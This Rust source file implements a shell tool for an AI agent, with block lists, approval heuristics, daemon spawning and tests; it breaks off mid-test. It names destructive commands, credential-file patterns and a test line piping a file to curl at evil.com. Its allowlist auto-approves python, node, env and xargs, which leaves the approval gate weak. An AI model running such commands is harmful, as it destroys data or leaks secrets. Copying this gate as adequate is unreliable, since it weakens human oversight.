//! Shell/Bash execution tool for running commands in the workspace.
//!
//! Provides controlled command execution with:
//! - Working directory isolation
//! - Timeout enforcement (default 30s)
//! - Output capture (stdout + stderr merged) with a 32 KB rolling tail buffer
//! - Blocked command patterns for safety
//! - Dangerous pattern detection
//! - Approval requirement for all executions

use std::collections::{HashSet, VecDeque};
use std::io::Write as _;
use std::path::PathBuf;
use std::process::Stdio;
use std::sync::LazyLock;
use std::time::Duration;

use async_trait::async_trait;
use tokio::io::AsyncReadExt;
use tokio::process::Command;
use tracing::{debug, warn};

use crate::agent::tools::tool::{ApprovalRequirement, Tool, ToolError, ToolErrorKind, ToolOutput};

/// LLM context limit for bash output (32 KB rolling tail buffer).
const CONTEXT_LIMIT: usize = 32 * 1024;

/// Default command timeout (30 seconds).
const DEFAULT_TIMEOUT: Duration = Duration::from_secs(30);

/// Commands that are always blocked — exact substring match on the normalized input.
static BLOCKED_COMMANDS: LazyLock<HashSet<&'static str>> = LazyLock::new(|| {
    HashSet::from([
        "rm -rf /",
        "rm -rf /*",
        "rm -fr /",
        "rm -fr /*",
        ":(){ :|:& };:",
        "dd if=/dev/zero",
        "mkfs",
        "chmod -R 777 /",
        "> /dev/sda",
        "curl | sh",
        "wget | sh",
        "curl | bash",
        "wget | bash",
    ])
});

/// Read-only / safe commands that can be auto-approved without user confirmation.
static SAFE_COMMANDS: LazyLock<HashSet<&'static str>> = LazyLock::new(|| {
    HashSet::from([
        "ls", "cat", "head", "tail", "pwd", "echo", "date", "whoami",
        "which", "env", "printenv", "wc", "sort", "uniq", "diff",
        "find", "grep", "awk", "tree", "file", "stat", "du", "df",
        "basename", "dirname", "realpath", "readlink", "tee",
        "less", "more", "man", "help", "type", "uname", "hostname",
        "id", "groups", "uptime", "free", "top", "ps", "lsof",
        "cargo", "rustc", "node", "python", "python3", "ruby",
        "git", "rg", "fd", "jq", "yq", "xargs", "test", "[",
        "true", "false", "printf", "tr", "cut", "paste", "join",
        "tac", "rev", "nl", "fold", "fmt", "column", "expand",
        "unexpand", "md5sum", "sha256sum", "sha1sum", "b2sum",
        "hexdump", "xxd", "strings", "od",
    ])
});

/// Commands that always require approval regardless of context.
static DANGEROUS_COMMANDS: LazyLock<HashSet<&'static str>> = LazyLock::new(|| {
    HashSet::from([
        "rm", "rmdir", "sudo", "su", "chmod", "chown", "chgrp",
        "mv", "cp", "dd", "mkfs", "mount", "umount",
        "curl", "wget", "ssh", "scp", "rsync",
        "pip", "pip3", "npm", "npx", "yarn", "pnpm", "brew",
        "apt", "apt-get", "yum", "dnf", "pacman", "snap",
        "docker", "podman", "kubectl",
        "kill", "killall", "pkill",
        "shutdown", "reboot", "poweroff", "init",
        "systemctl", "service", "launchctl",
        "crontab", "at",
        "nmap", "netcat", "nc",
        "eval", "exec",
    ])
});


/// Substrings that indicate a potentially dangerous command.
static DANGEROUS_PATTERNS: LazyLock<Vec<&'static str>> = LazyLock::new(|| {
    vec![
        "sudo ",
        "doas ",
        " | sh",
        " | bash",
        " | zsh",
        "eval ",
        "$(curl",
        "$(wget",
        "/etc/passwd",
        "/etc/shadow",
        "~/.ssh",
        ".bash_history",
        "id_rsa",
        "shutdown",
        "reboot",
        "poweroff",
        "init 0",
        "init 6",
    ]
});

/// System-critical directories where command execution is forbidden.
static FORBIDDEN_DIRS: LazyLock<Vec<&'static str>> = LazyLock::new(|| {
    vec!["/", "/bin", "/sbin", "/usr", "/etc", "/var", "/System", "/Library"]
});

/// 保留最近 N 字节的滚动尾部缓冲区。
/// 超出 capacity 时，最旧的字节从头部丢弃。
struct RollingTailBuffer {
    capacity: usize,
    buf: VecDeque<u8>,
    total_written: usize,
    dropped: usize,
}

impl RollingTailBuffer {
    fn new(capacity: usize) -> Self {
        Self {
            capacity,
            buf: VecDeque::with_capacity(capacity),
            total_written: 0,
            dropped: 0,
        }
    }

    fn push_bytes(&mut self, data: &[u8]) {
        self.total_written += data.len();
        let data = if data.len() >= self.capacity {
            // Input is larger than the whole buffer — skip bytes we'd immediately evict.
            let skip = data.len() - self.capacity;
            self.dropped += self.buf.len() + skip;
            self.buf.clear();
            &data[skip..]
        } else {
            data
        };
        for &byte in data {
            if self.buf.len() >= self.capacity {
                self.buf.pop_front();
                self.dropped += 1;
            }
            self.buf.push_back(byte);
        }
    }

    /// 生成返回给 LLM 的字符串。
    /// `temp_path` 有值时在截断头注中附加文件路径。
    fn to_truncated_string(&self, temp_path: Option<&std::path::Path>) -> String {
        let (a, b) = self.buf.as_slices();
        let content = format!(
            "{}{}",
            String::from_utf8_lossy(a),
            String::from_utf8_lossy(b)
        );
        if self.dropped > 0 {
            let path_note = temp_path
                .map(|p| format!("，完整输出已保存至 {}", p.display()))
                .unwrap_or_default();
            format!(
                "[输出已截断：共 {} 字节，显示最后 {} 字节{path_note}]\n\n{}",
                self.total_written,
                self.buf.len(),
                content
            )
        } else {
            content
        }
    }
}

/// 增量溢出落盘:首次累计字节越过 `CONTEXT_LIMIT` 时开 temp 文件,
/// 把迄今收到的所有字节全部刷入,之后每块直接 append。
/// 内存恒定(threshold 前暂存不超过 CONTEXT_LIMIT + 一个 chunk),
/// 完整输出在磁盘,供前端「加载完整日志」。
struct OverflowSink {
    dir: Option<PathBuf>,
    /// 未触发溢出时暂存所有字节(最多 CONTEXT_LIMIT + 一个 chunk)。
    pre_buf: Vec<u8>,
    file: Option<std::fs::File>,
    path: Option<PathBuf>,
    total: usize,
}

impl OverflowSink {
    fn new(dir: Option<PathBuf>) -> Self {
        Self { dir, pre_buf: Vec::new(), file: None, path: None, total: 0 }
    }

    fn write(&mut self, _tail_buf: &RollingTailBuffer, chunk: &[u8]) {
        self.total += chunk.len();
        if self.file.is_none() {
            // Still below threshold — buffer the raw chunk.
            self.pre_buf.extend_from_slice(chunk);
            if self.total <= CONTEXT_LIMIT {
                return;
            }
            // Crossed threshold: open file and flush everything buffered so far.
            let Some(dir) = self.dir.clone() else { return };
            let _ = std::fs::create_dir_all(&dir);
            let path = dir.join(format!("bash-{}.log", uuid::Uuid::new_v4()));
            match std::fs::File::create(&path) {
                Ok(mut f) => {
                    if let Err(e) = f.write_all(&self.pre_buf) {
                        tracing::warn!(path = %path.display(), error = %e, "bash: temp flush failed");
                        return;
                    }
                    self.pre_buf = Vec::new(); // free the pre-buffer
                    self.file = Some(f);
                    self.path = Some(path);
                }
                Err(e) => {
                    tracing::warn!(path = %path.display(), error = %e, "bash: failed to open overflow log");
                }
            }
        } else if let Some(f) = &mut self.file {
            if let Err(e) = f.write_all(chunk) {
                tracing::warn!(error = %e, "bash: temp append failed");
            }
        }
    }

    fn finish(&mut self) {
        if let Some(f) = &mut self.file {
            let _ = f.flush();
        }
        self.file = None;
    }

    fn path(&self) -> Option<&std::path::Path> {
        self.path.as_deref()
    }
}

/// Shell execution tool.
pub struct BashTool {
    workspace_root: PathBuf,
    temp_dir: Option<PathBuf>,
}

impl BashTool {
    pub fn new(workspace_root: PathBuf) -> Self {
        Self { workspace_root, temp_dir: None }
    }

    /// 带自定义 temp 目录的构造函数（主要用于测试）。
    pub fn new_with_temp_dir(workspace_root: PathBuf, temp_dir: Option<PathBuf>) -> Self {
        let mut tool = Self::new(workspace_root);
        tool.temp_dir = temp_dir;
        tool
    }

    /// 解析运行时 temp 目录：优先用 self.temp_dir，否则用 ~/.uclaw/temp/
    fn resolve_temp_dir(&self) -> Option<PathBuf> {
        if let Some(ref d) = self.temp_dir {
            return Some(d.clone());
        }
        uclaw_utils_home::uclaw_home_pathbuf().ok().map(|h| h.join("temp"))
    }

    /// Check if a command should be blocked. Returns a reason string if blocked.
    fn check_blocked(cmd: &str) -> Option<&'static str> {
        let normalized = cmd.to_lowercase();

        for blocked in BLOCKED_COMMANDS.iter() {
            if normalized.contains(blocked) {
                return Some("Command matches a blocked pattern");
            }
        }

        for pattern in DANGEROUS_PATTERNS.iter() {
            if normalized.contains(pattern) {
                return Some("Command contains a potentially dangerous pattern");
            }
        }

        None
    }

    /// Determine if a command is safe (read-only) and can skip approval.
    ///
    /// Returns `true` when every sub-command in a potentially chained pipeline
    /// resolves to a known safe (read-only) program.  Returns `false` if any
    /// segment uses a dangerous command, an output redirect, or is unrecognised.
    fn is_safe_command(command: &str) -> bool {
        let trimmed = command.trim();
        if trimmed.is_empty() {
            return true;
        }

        // Reject if the command contains output redirection (writes to files).
        if trimmed.contains(">>") || trimmed.contains("> ") || trimmed.contains(">\t") {
            // Allow `2>&1` style fd redirects – but plain `>` / `>>` is a write.
            // Simple heuristic: split on `>` and check the segment before it.
            // For now, conservatively require approval for any redirect.
            return false;
        }

        // Reject if the command contains output redirection.
        // (Check moved above the segment loop for efficiency.)

        // Split on chain operators: |, ;, &&, ||
        // We split on the multi-char operators first to avoid mis-splitting.
        let segments = Self::split_command_chain(trimmed);

        for segment in &segments {
            let seg = segment.trim();
            if seg.is_empty() {
                continue;
            }

            // Extract the base command name (first token), stripping any leading
            // env assignments like `FOO=bar cmd ...`
            let base_cmd = Self::extract_base_command(seg);

            if base_cmd.is_empty() {
                continue;
            }

            // If the base command is in the dangerous set, not safe.
            if DANGEROUS_COMMANDS.contains(base_cmd) {
                return false;
            }

            // `sed` without `-n`/`--quiet`/`--silent` is considered a write command.
            if base_cmd == "sed" {
                let seg_lower = seg.to_lowercase();
                if !seg_lower.contains("-n") && !seg_lower.contains("--quiet") && !seg_lower.contains("--silent") {
                    return false;
                }
                // sed -n is read-only, allow it
                continue;
            }

            // If the base command is NOT in the safe set, we don't know it → require approval.
            if !SAFE_COMMANDS.contains(base_cmd) {
                return false;
            }
        }

        true
    }

    /// Split a command string on shell chain operators (|, ;, &&, ||).
    fn split_command_chain(cmd: &str) -> Vec<&str> {
        // We do a simple left-to-right scan. This doesn't handle quotes, but
        // is good enough for the approval heuristic.
        let mut segments = Vec::new();
        let mut start = 0;
        let bytes = cmd.as_bytes();
        let len = bytes.len();
        let mut i = 0;

        while i < len {
            let ch = bytes[i];
            match ch {
                b'|' => {
                    if i + 1 < len && bytes[i + 1] == b'|' {
                        // ||
                        segments.push(&cmd[start..i]);
                        start = i + 2;
                        i += 2;
                    } else {
                        // |
                        segments.push(&cmd[start..i]);
                        start = i + 1;
                        i += 1;
                    }
                }
                b'&' if i + 1 < len && bytes[i + 1] == b'&' => {
                    // &&
                    segments.push(&cmd[start..i]);
                    start = i + 2;
                    i += 2;
                }
                b';' => {
                    segments.push(&cmd[start..i]);
                    start = i + 1;
                    i += 1;
                }
                _ => {
                    i += 1;
                }
            }
        }

        if start < len {
            segments.push(&cmd[start..]);
        }

        segments
    }

    /// Extract the base command name from a shell segment.
    ///
    /// Skips leading environment variable assignments (`FOO=bar`) and returns
    /// the basename of the command (e.g. `/usr/bin/ls` → `ls`).
    fn extract_base_command(segment: &str) -> &str {
        for token in segment.split_whitespace() {
            // Skip env-var assignments
            if token.contains('=') && !token.starts_with('-') {
                continue;
            }
            // Get basename (strip path)
            let base = token.rsplit('/').next().unwrap_or(token);
            return base;
        }
        ""
    }

    /// Check if the working directory is forbidden.
    fn check_working_dir(dir: &PathBuf) -> Option<&'static str> {
        let dir_str = dir.to_string_lossy();
        for forbidden in FORBIDDEN_DIRS.iter() {
            if dir_str == *forbidden {
                return Some("Execution in system-critical directory is not allowed");
            }
        }
        None
    }

    /// Spawn a fully detached daemon process and return immediately.
    ///
    /// Unlike the foreground path:
    /// - Uses `std::process::Command` (not tokio) so we don't keep a Child handle the
    ///   async runtime would have to manage. We `forget` the handle on success.
    /// - On Unix, calls `setsid()` via `pre_exec` so the child runs in a new session
    ///   and is not affected by SIGHUP when uClaw exits.
    /// - Redirects stdin/stdout/stderr to `/dev/null` so closing the pipe from our end
    ///   won't generate SIGPIPE on the child.
    /// - Does NOT enable `kill_on_drop` — this is the whole point of daemon mode.
    ///
    /// Returns `{ ok, pid, daemon: true, command }`. Output capture is intentionally
    /// disabled — use `tail -f` or a separate `bash` call to inspect logs.
    fn spawn_daemon(
        command: &str,
        working_dir: &PathBuf,
        start: std::time::Instant,
    ) -> Result<ToolOutput, ToolError> {
        use std::process::Command as StdCommand;

        let mut cmd = StdCommand::new("sh");
        cmd.arg("-c")
            .arg(command)
            .current_dir(working_dir)
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null());

        // Detach from parent process group on Unix so SIGHUP from uClaw doesn't
        // cascade into the daemon.
        #[cfg(unix)]
        {
            use std::os::unix::process::CommandExt;
            unsafe {
                cmd.pre_exec(|| {
                    // Create a new session — child becomes session leader, has no
                    // controlling terminal, won't receive SIGHUP from uClaw shell.
                    if libc::setsid() == -1 {
                        return Err(std::io::Error::last_os_error());
                    }
                    Ok(())
                });
            }
        }

        let child = cmd.spawn().map_err(|e| {
            let kind = if e.kind() == std::io::ErrorKind::NotFound {
                ToolErrorKind::ResourceNotFound
            } else if e.kind() == std::io::ErrorKind::PermissionDenied {
                ToolErrorKind::PermissionDenied
            } else {
                ToolErrorKind::Other
            };
            ToolError::kinded_with_source(kind, "Failed to spawn daemon process", e.to_string())
        })?;

        let pid = child.id();
        // Drop the Child handle without waiting — the OS will reap via init/launchd
        // once the daemon exits. We don't want kill_on_drop semantics here.
        std::mem::forget(child);

        debug!(
            pid = %pid,
            command = %command,
            working_dir = %working_dir.display(),
            "bash: spawned daemon process"
        );

        let result = serde_json::json!({
            "ok": true,
            "pid": pid,
            "daemon": true,
            "command": command,
            "note": "Daemon detached. Output not captured. Use `ps -p <pid>` or `tail -f <logfile>` to monitor.",
        });
        Ok(ToolOutput::new(result, start.elapsed().as_millis() as u64))
    }

    /// 核心执行逻辑,带可选流式 sink。`execute` / `execute_streaming` 都委托到这里。
    async fn run(
        &self,
        params: serde_json::Value,
        sink: crate::agent::tools::stream::ToolStreamSink,
    ) -> Result<ToolOutput, ToolError> {
        use crate::agent::tools::stream::ToolStream;

        let start = std::time::Instant::now();

        let command = params["command"]
            .as_str()
            .ok_or_else(|| ToolError::InvalidParams("command is required".into()))?;

        let working_dir = match params["working_dir"].as_str() {
            Some(dir) => {
                let p = PathBuf::from(dir);
                if p.is_absolute() { p } else { self.workspace_root.join(p) }
            }
            None => self.workspace_root.clone(),
        };
        let timeout = params["timeout_ms"]
            .as_u64()
            .map(Duration::from_millis)
            .unwrap_or(DEFAULT_TIMEOUT);
        let daemon = params["daemon"].as_bool().unwrap_or(false);

        debug!(command = %command, working_dir = %working_dir.display(), timeout_ms = %timeout.as_millis(), daemon = %daemon, "bash: executing command");

        if let Some(reason) = Self::check_blocked(command) {
            warn!(command = %command, reason = %reason, "bash: command blocked");
            return Ok(ToolOutput::error(
                &format!("Command blocked: {reason}"),
                start.elapsed().as_millis() as u64,
            ));
        }
        if let Some(reason) = Self::check_working_dir(&working_dir) {
            warn!(working_dir = %working_dir.display(), reason = %reason, "bash: working directory blocked");
            return Ok(ToolOutput::error(
                &format!("Working directory blocked: {reason}"),
                start.elapsed().as_millis() as u64,
            ));
        }
        if !working_dir.exists() {
            return Ok(ToolOutput::error(
                &format!("Working directory does not exist: {}", working_dir.display()),
                start.elapsed().as_millis() as u64,
            ));
        }

        if daemon {
            return Self::spawn_daemon(command, &working_dir, start);
        }

        let mut child = Command::new("sh")
            .arg("-c")
            .arg(command)
            .current_dir(&working_dir)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .stdin(Stdio::null())
            .kill_on_drop(true)
            .spawn()
            .map_err(|e| {
                let kind = if e.kind() == std::io::ErrorKind::NotFound {
                    ToolErrorKind::ResourceNotFound
                } else if e.kind() == std::io::ErrorKind::PermissionDenied {
                    ToolErrorKind::PermissionDenied
                } else {
                    ToolErrorKind::Other
                };
                ToolError::kinded_with_source(kind, "Failed to spawn process", e.to_string())
            })?;

        let mut stdout = child.stdout.take();
        let mut stderr = child.stderr.take();
        let mut tail_buf = RollingTailBuffer::new(CONTEXT_LIMIT);
        let mut overflow = OverflowSink::new(self.resolve_temp_dir());

        let result = tokio::time::timeout(timeout, async {
            let mut buf_out = [0u8; 8192];
            let mut buf_err = [0u8; 8192];
            let (mut out_open, mut err_open) = (stdout.is_some(), stderr.is_some());

            while out_open || err_open {
                // Use futures::future::Either-style branching to avoid simultaneous
                // mutable borrow of two Option<ChildStdout/Stderr> inside select! arms.
                // We drive both reads via explicit async blocks referencing distinct vars.
                let read_out = async {
                    if out_open {
                        if let Some(ref mut s) = stdout {
                            Some(s.read(&mut buf_out).await)
                        } else {
                            None
                        }
                    } else {
                        None
                    }
                };
                let read_err = async {
                    if err_open {
                        if let Some(ref mut s) = stderr {
                            Some(s.read(&mut buf_err).await)
                        } else {
                            None
                        }
                    } else {
                        None
                    }
                };

                tokio::select! {
                    maybe = read_out, if out_open => {
                        match maybe {
                            None | Some(Ok(0)) | Some(Err(_)) => out_open = false,
                            Some(Ok(n)) => {
                                let chunk = &buf_out[..n];
                                tail_buf.push_bytes(chunk);
                                overflow.write(&tail_buf, chunk);
                                sink.send(ToolStream::Stdout, chunk);
                            }
                        }
                    },
                    maybe = read_err, if err_open => {
                        match maybe {
                            None | Some(Ok(0)) | Some(Err(_)) => err_open = false,
                            Some(Ok(n)) => {
                                let chunk = &buf_err[..n];
                                tail_buf.push_bytes(chunk);
                                overflow.write(&tail_buf, chunk);
                                sink.send(ToolStream::Stderr, chunk);
                            }
                        }
                    },
                }
            }
            child.wait().await
        })
        .await;

        let duration_ms = start.elapsed().as_millis() as u64;

        match result {
            Ok(status) => {
                overflow.finish();
                let combined = tail_buf.to_truncated_string(overflow.path());
                let exit_code = status.ok().and_then(|s| s.code()).unwrap_or(-1);
                debug!(exit_code = %exit_code, output_len = %combined.len(), "bash: command completed");
                let result = serde_json::json!({
                    "ok": exit_code == 0,
                    "exit_code": exit_code,
                    "output": combined,
                });
                Ok(ToolOutput::new(result, duration_ms))
            }
            Err(_) => {
                warn!(command = %command, timeout_ms = %timeout.as_millis(), "bash: command timed out, killing process");
                overflow.finish();
                Ok(ToolOutput::error(
                    &format!("Command timed out after {}ms", timeout.as_millis()),
                    duration_ms,
                ))
            }
        }
    }

}

#[async_trait]
impl Tool for BashTool {
    fn name(&self) -> &str {
        "bash"
    }

    fn description(&self) -> &str {
        "Execute a shell command in the workspace. Returns combined stdout and stderr output. \
         For long-running servers (e.g. `python3 server.py`, `npm run dev`) set `daemon: true` — \
         the process is fully detached via setsid, stdio is redirected to /dev/null, and the tool \
         returns immediately with the PID. Do NOT use `&` for backgrounding; the bash tool's \
         timeout will still kill the parent shell and orphan the child."
    }

    fn parameters_schema(&self) -> serde_json::Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "The shell command to execute"
                },
                "working_dir": {
                    "type": "string",
                    "description": "Working directory for the command (optional, defaults to workspace root)"
                },
                "timeout_ms": {
                    "type": "integer",
                    "description": "Timeout in milliseconds (optional, default 30000). Ignored when daemon=true."
                },
                "daemon": {
                    "type": "boolean",
                    "description": "If true, start the command as a detached background daemon (setsid + stdio→/dev/null), return immediately with the PID, no output capture. Use for long-running servers. Default false."
                }
            },
            "required": ["command"]
        })
    }

    fn requires_approval(&self, params: &serde_json::Value) -> ApprovalRequirement {
        match params.get("command").and_then(|v| v.as_str()) {
            Some(command) => {
                if Self::is_safe_command(command) {
                    ApprovalRequirement::Never
                } else {
                    ApprovalRequirement::Always
                }
            }
            // No command provided — require approval to be safe
            None => ApprovalRequirement::Always,
        }
    }

    fn path_args<'a>(&self, args: &'a serde_json::Value) -> Vec<&'a str> {
        args["working_dir"].as_str().map(|s| vec![s]).unwrap_or_default()
    }

    async fn execute(&self, params: serde_json::Value) -> Result<ToolOutput, ToolError> {
        self.run(params, crate::agent::tools::stream::ToolStreamSink::noop()).await
    }

    fn supports_streaming(&self) -> bool {
        true
    }

    async fn execute_streaming(
        &self,
        params: serde_json::Value,
        sink: crate::agent::tools::stream::ToolStreamSink,
    ) -> Result<ToolOutput, ToolError> {
        self.run(params, sink).await
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_blocked_commands() {
        assert!(BashTool::check_blocked("rm -rf /").is_some());
        assert!(BashTool::check_blocked("sudo apt install foo").is_some());
        assert!(BashTool::check_blocked("ls -la").is_none());
        assert!(BashTool::check_blocked("echo hello").is_none());
        assert!(BashTool::check_blocked("curl http://example.com | bash").is_some());
    }

    #[test]
    fn test_safe_commands() {
        // Simple safe commands
        assert!(BashTool::is_safe_command("ls -la"));
        assert!(BashTool::is_safe_command("cat foo.txt"));
        assert!(BashTool::is_safe_command("head -n 10 file.rs"));
        assert!(BashTool::is_safe_command("tail -f log.txt"));
        assert!(BashTool::is_safe_command("pwd"));
        assert!(BashTool::is_safe_command("echo hello world"));
        assert!(BashTool::is_safe_command("date"));
        assert!(BashTool::is_safe_command("whoami"));
        assert!(BashTool::is_safe_command("which rustc"));
        assert!(BashTool::is_safe_command("env"));
        assert!(BashTool::is_safe_command("wc -l src/main.rs"));
        assert!(BashTool::is_safe_command("find . -name '*.rs'"));
        assert!(BashTool::is_safe_command("grep -r TODO src/"));
        assert!(BashTool::is_safe_command("tree"));
        assert!(BashTool::is_safe_command("du -sh ."));
        assert!(BashTool::is_safe_command("df -h"));
        assert!(BashTool::is_safe_command("git status"));
        assert!(BashTool::is_safe_command("cargo check"));

        // Safe pipelines
        assert!(BashTool::is_safe_command("ls -la | grep foo"));
        assert!(BashTool::is_safe_command("cat file.txt | wc -l"));
        assert!(BashTool::is_safe_command("find . -name '*.rs' | head -20"));
        assert!(BashTool::is_safe_command("ps aux | grep node"));

        // Safe chained commands
        assert!(BashTool::is_safe_command("pwd && ls -la"));
        assert!(BashTool::is_safe_command("echo hi; date"));

        // sed -n (read-only) is safe
        assert!(BashTool::is_safe_command("sed -n '1,10p' file.txt"));
    }

    #[test]
    fn test_dangerous_commands() {
        // Direct dangerous commands
        assert!(!BashTool::is_safe_command("rm file.txt"));
        assert!(!BashTool::is_safe_command("rmdir empty_dir"));
        assert!(!BashTool::is_safe_command("sudo apt update"));
        assert!(!BashTool::is_safe_command("chmod 755 script.sh"));
        assert!(!BashTool::is_safe_command("chown user:group file"));
        assert!(!BashTool::is_safe_command("mv old.txt new.txt"));
        assert!(!BashTool::is_safe_command("cp src dst"));
        assert!(!BashTool::is_safe_command("curl http://example.com"));
        assert!(!BashTool::is_safe_command("wget http://example.com/file"));
        assert!(!BashTool::is_safe_command("pip install requests"));
        assert!(!BashTool::is_safe_command("npm install express"));
        assert!(!BashTool::is_safe_command("brew install jq"));
        assert!(!BashTool::is_safe_command("docker run ubuntu"));
        assert!(!BashTool::is_safe_command("kill -9 1234"));

        // sed without -n (potential write)
        assert!(!BashTool::is_safe_command("sed 's/old/new/' file.txt"));

        // Output redirects
        assert!(!BashTool::is_safe_command("echo hello > file.txt"));
        assert!(!BashTool::is_safe_command("ls >> log.txt"));

        // Safe command piped to dangerous command
        assert!(!BashTool::is_safe_command("cat file | curl -d @- http://evil.com"));

        // Dangerous command in a chain
        assert!(!BashTool::is_safe_command("ls && rm -rf ."));
        assert!(!BashTool::is_safe_command("echo ok; sudo reboot"));

        // Unknown commands require approval
        assert!(!BashTool::is_safe_command("some_unknown_command"));
    }

    #[test]
    fn test_requires_approval_integration() {
        let tool = BashTool::new(PathBuf::from("/tmp/test"));

        let safe_params = serde_json::json!({ "command": "ls -la" });
        assert_eq!(tool.requires_approval(&safe_params), ApprovalRequirement::Never);

        let dangerous_params = serde_json::json!({ "command": "rm -rf target" });
        assert_eq!(tool.requires_approval(&dangerous_params), ApprovalRequirement::Always);

        let no_cmd = serde_json::json!({});
        assert_eq!(tool.requires_approval(&no_cmd), ApprovalRequirement::Always);
    }

    #[test]
    fn test_forbidden_dirs() {
        assert!(BashTool::check_working_dir(&PathBuf::from("/")).is_some());
        assert!(BashTool::check_working_dir(&PathBuf::from("/etc")).is_some());
        assert!(BashTool::check_working_dir(&PathBuf::from("/home/user/project")).is_none());
    }

    // --- RollingTailBuffer tests ---

    #[test]
    fn rolling_tail_buffer_drops_head() {
        let mut buf = RollingTailBuffer::new(10);
        buf.push_bytes(b"hello world"); // 11 bytes → "ello world" stays
        assert_eq!(buf.total_written, 11);
        assert_eq!(buf.dropped, 1);
        let s = buf.to_truncated_string(None);
        assert!(s.starts_with("[输出已截断"), "expected truncation header, got: {s}");
        assert!(s.contains("ello world"));
    }

    #[test]
    fn rolling_tail_buffer_no_drop_when_within_capacity() {
        let mut buf = RollingTailBuffer::new(100);
        buf.push_bytes(b"small");
        assert_eq!(buf.dropped, 0);
        assert_eq!(buf.to_truncated_string(None), "small");
    }

    #[test]
    fn rolling_tail_buffer_exactly_at_capacity() {
        let mut buf = RollingTailBuffer::new(5);
        buf.push_bytes(b"hello"); // exactly 5 bytes
        assert_eq!(buf.dropped, 0);
        assert_eq!(buf.to_truncated_string(None), "hello");
    }

    // --- Integration test: large output writes temp file ---

    #[tokio::test]
    async fn bash_large_output_writes_temp_file() {
        let tmp_dir = tempfile::tempdir().unwrap();
        let tool = BashTool::new_with_temp_dir(
            std::path::PathBuf::from("/tmp"),
            Some(tmp_dir.path().to_path_buf()),
        );
        // 生成超过 32KB 的输出
        let params = serde_json::json!({
            "command": "python3 -c \"print('x' * 40000)\""
        });
        let output = tool.execute(params).await.unwrap();
        let result = &output.result;
        let out_str = result["output"].as_str().unwrap();
        assert!(out_str.contains("输出已截断"), "expected truncation header, got: {out_str}");
        assert!(out_str.contains(".log"), "expected temp file path in output");
        // temp 文件应该存在
        let log_path = out_str
            .lines()
            .find(|l| l.contains(".log"))
            .and_then(|l| l.split("保存至 ").nth(1))
            .and_then(|s| s.split(']').next())
            .unwrap_or("");
        assert!(std::path::Path::new(log_path).exists(), "temp log file should exist at {log_path}");
    }

    // --- Bundle 25-A: daemon mode tests ---

    /// Daemon mode returns immediately with a PID; the spawned process keeps running
    /// after the tool call returns. We verify by spawning `sleep 30` as daemon, then
    /// checking the returned PID is reachable via `kill -0`.
    #[cfg(unix)]
    #[tokio::test]
    async fn test_daemon_mode_returns_pid_and_process_alive() {
        let tmp = std::env::temp_dir();
        let tool = BashTool::new(tmp.clone());

        let params = serde_json::json!({
            "command": "sleep 30",
            "daemon": true,
        });

        let t0 = std::time::Instant::now();
        let out = tool.execute(params).await.expect("daemon execute");
        let elapsed_ms = t0.elapsed().as_millis();

        // Should return well under the foreground 30s timeout — daemon mode
        // skips the wait entirely.
        assert!(
            elapsed_ms < 2000,
            "daemon spawn should return immediately, took {elapsed_ms}ms"
        );

        let pid = out.result["pid"].as_u64().expect("pid in result");
        assert!(pid > 0);
        assert_eq!(out.result["daemon"], serde_json::Value::Bool(true));
        assert_eq!(out.result["ok"], serde_json::Value::Bool(true));

        // Verify the process is actually alive — kill -0 returns 0 for running pid.
        let alive = std::process::Command::new("kill")
            .args(["-0", &pid.to_string()])
            .status()
            .map(|s| s.success())
            .unwrap_or(false);
        assert!(alive, "daemon pid {pid} should be alive after spawn");

        // Clean up — we spawned a real sleep process.
        let _ = std::process::Command::new("kill")
            .args(["-TERM", &pid.to_string()])
            .status();
    }

    /// Daemon mode still respects safety checks — `rm -rf /` is blocked even with daemon=true.
    #[cfg(unix)]
    #[tokio::test]
    async fn test_daemon_mode_respects_blocked_commands() {
        let tool = BashTool::new(std::env::temp_dir());
        let params = serde_json::json!({
            "command": "rm -rf /",
            "daemon": true,
        });
        let out = tool.execute(params).await.expect("execute");
        assert_eq!(out.result["ok"], serde_json::Value::Bool(false));
        assert!(out
            .result
            .get("error")
            .and_then(|e| e.as_str())
            .unwrap_or("")
            .to_lowercase()
            .contains("blocked"));
    }

    /// `daemon: true` for a dangerous-but-allowed command still requires approval.
    /// (Approval is decided by `requires_approval(params)`, not by `execute`.)
    #[test]
    fn test_daemon_mode_approval_unchanged() {
        let tool = BashTool::new(PathBuf::from("/tmp"));

        // Safe command + daemon=true → still Never approval
        let safe_daemon = serde_json::json!({ "command": "echo hi", "daemon": true });
        assert_eq!(
            tool.requires_approval(&safe_daemon),
            ApprovalRequirement::Never
        );

        // Unknown command + daemon=true → still Always approval
        let unknown_daemon = serde_json::json!({ "command": "python3 server.py", "daemon": true });
        assert_eq!(
            tool.requires_approval(&unknown_daemon),
            ApprovalRequirement::Always
        );
    }

    // --- Streaming tests (Pi Sprint 2 Task 4) ---

    #[tokio::test]
    async fn execute_streaming_emits_interleaved_chunks() {
        use crate::agent::tools::stream::{ToolStream, ToolStreamSink};
        let tool = BashTool::new(std::path::PathBuf::from("/tmp"));
        let (sink, mut rx) = ToolStreamSink::channel(64);
        let params = serde_json::json!({
            "command": "printf 'OUT1\\n'; printf 'ERR1\\n' 1>&2; printf 'OUT2\\n'"
        });
        let out = tool.execute_streaming(params, sink).await.unwrap();

        let mut events = vec![];
        while let Ok(e) = rx.try_recv() { events.push(e); }
        assert!(!events.is_empty(), "streaming sink should have received chunks");
        for w in events.windows(2) { assert!(w[1].seq > w[0].seq); }
        assert!(events.iter().any(|e| e.stream == ToolStream::Stdout));
        assert!(events.iter().any(|e| e.stream == ToolStream::Stderr));
        let output = out.result["output"].as_str().unwrap();
        assert!(output.contains("OUT1") && output.contains("OUT2"));
        assert!(output.contains("ERR1"));
    }

    #[tokio::test]
    async fn execute_still_works_without_streaming() {
        let tool = BashTool::new(std::path::PathBuf::from("/tmp"));
        let out = tool.execute(serde_json::json!({ "command": "echo hello" })).await.unwrap();
        assert!(out.result["output"].as_str().unwrap().contains("hello"));
        assert_eq!(out.result["exit_code"], serde_json::json!(0));
    }

    // --- OverflowSink tests ---

    #[test]
    fn overflow_sink_no_file_under_threshold() {
        let dir = tempfile::tempdir().unwrap();
        let mut tail = RollingTailBuffer::new(32 * 1024);
        let mut sink = OverflowSink::new(Some(dir.path().to_path_buf()));
        let chunk = vec![b'x'; 1000];
